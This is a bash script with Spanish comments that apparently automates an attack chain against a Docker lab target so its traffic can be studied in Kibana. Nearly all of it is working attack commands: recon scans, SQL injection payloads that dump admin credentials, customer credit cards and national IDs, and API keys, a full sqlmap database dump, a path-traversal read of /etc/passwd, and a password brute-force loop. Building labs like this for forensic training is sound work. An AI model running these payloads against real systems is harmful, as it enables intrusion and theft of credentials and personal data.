#!/usr/bin/env bash
# =====================================================================
#  Cadena de ataque automatizada contra el target del laboratorio.
#  Ejecutar DESDE la attacker box:
#     docker compose exec attacker bash /opt/attack.sh
#  (monta este archivo o copialo; ver README)
# =====================================================================
set -u
TARGET="http://web"          # nombre del servicio en la red lab-net
PORT="80"
BASE="${TARGET}:${PORT}"

line(){ echo; echo "==================== $* ===================="; }

# ------------------- FASE 1: RECONOCIMIENTO -------------------
line "FASE 1 — RECON: descubrimiento de host y servicios (nmap)"
nmap -sV -p1-1000 web

line "FASE 1 — RECON: fingerprinting de tecnologia (whatweb)"
whatweb -a 3 "$BASE" || true

line "FASE 1 — RECON: enumeracion de directorios (gobuster)"
gobuster dir -u "$BASE" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -q -t 20 || true

# ------------------- FASE 2: EXPLOTACION -------------------
line "FASE 2 — EXPLOIT: deteccion manual de SQLi (error-based)"
curl -s "$BASE/product.php?id=1'" | grep -i "sql error" && echo "[+] Parametro id es inyectable"

line "FASE 2 — EXPLOIT: numero de columnas (ORDER BY)"
for n in 1 2 3 4 5; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/product.php?id=1%20ORDER%20BY%20$n--%20-")
  echo "ORDER BY $n -> HTTP $code"
done

line "FASE 2 — EXPLOIT: enumerar tablas de la base de datos (UNION)"
curl -s "$BASE/product.php?id=-1%20UNION%20SELECT%20GROUP_CONCAT(table_name),NULL,NULL,NULL%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-" \
  | grep -Eo "name:.*" | head -n 5

line "FASE 2 — EXPLOIT: volcar credenciales de admin (tabla users)"
curl -s "$BASE/product.php?id=-1%20UNION%20SELECT%20id,username,password,role%20FROM%20users--%20-" \
  | grep -Eo "name:.*|description:.*" | head -n 20

line "FASE 2 — EXPLOIT: EXFILTRAR PII de clientes (tabla customers)"
curl -s "$BASE/product.php?id=-1%20UNION%20SELECT%20full_name,email,credit_card,national_id%20FROM%20customers--%20-" \
  | grep -Eo "name:.*|description:.*|price:.*" | head -n 40

line "FASE 2 — EXPLOIT: robar API keys (tabla api_keys)"
curl -s "$BASE/product.php?id=-1%20UNION%20SELECT%20service,api_key,NULL,NULL%20FROM%20api_keys--%20-" \
  | grep -Eo "name:.*|description:.*" | head -n 20

line "FASE 2 — EXPLOIT: sqlmap vuelca la BASE DE DATOS COMPLETA (appdb)"
sqlmap -u "$BASE/product.php?id=1" --batch --dbms=mysql \
  -D appdb --dump-all --exclude-sysdbs --threads=4 || true

line "FASE 2 — EXPLOIT: LFI / path traversal (/etc/passwd)"
curl -s "$BASE/view.php?page=../../../../etc/passwd" | head -n 5

# ------------------- FASE 3: marca de post-explotacion -------------------
line "FASE 3 — Generando trafico 'ruidoso' (404s + brute force login)"
for p in admin.php config.bak backup.zip .git/config wp-login.php; do
  curl -s -o /dev/null -w "404? %{http_code}  $p\n" "$BASE/$p"
done
for pw in 123456 password admin letmein toor; do
  curl -s -o /dev/null -X POST -d "username=admin&password=$pw" "$BASE/login.php"
done

line "Ataque completado — revisa Kibana (index weblogs-*) para el analisis forense"
